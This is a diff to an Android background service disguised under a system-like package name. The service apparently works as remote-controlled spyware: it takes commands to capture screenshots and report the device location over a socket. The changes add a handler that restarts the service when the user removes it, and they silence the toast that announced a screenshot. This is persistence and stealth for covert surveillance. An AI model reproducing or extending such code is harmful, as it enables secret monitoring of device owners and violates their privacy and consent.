@@ -1,5 +1,6 @@
 package andriod.sys;
 
+
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -47,6 +48,7 @@ import java.util.concurrent.ExecutionException;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
+
 
 public class sysService extends Service implements SysInterface{
     // variables
@@ -126,6 +128,16 @@ public class sysService extends Service implements SysInterface{
         Intent broadcastIntent = new Intent("ac.in.ActivityRecognition.RestartSensor");
         sendBroadcast(broadcastIntent);
     }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        toast("onTaskRemoved");
+        resetSocket();
+        Intent broadcastIntent = new Intent("ac.in.ActivityRecognition.RestartSensor");
+        sendBroadcast(broadcastIntent);
+    }
+
     public void resetSocket(){
         SignallingClient.instance.socket.close();
         SignallingClient.instance = null;
@@ -201,7 +213,7 @@ public class sysService extends Service implements SysInterface{
         if (cmd.contains("screenshot")){
             int shotN = Integer.parseInt(cmd.split(":")[1]);
             sendScreenshot(shotN);
-            toast("get screenshot");
+           // toast("get screenshot");
         }
         if (cmd.contains("getLocation")){
             sendLocation();
@@ -589,16 +601,4 @@ public class sysService extends Service implements SysInterface{
         });
     }
 
-
-/*
-    private void openScreenshot(File imageFile) {
-        Intent intent = new Intent();
-        intent.setAction(Intent.ACTION_VIEW);
-        Uri uri = Uri.fromFile(imageFile);
-        intent.setDataAndType(uri, "image/*");
-        startActivity(intent);
-    }
-    // end screen shot
-
-*/
 }
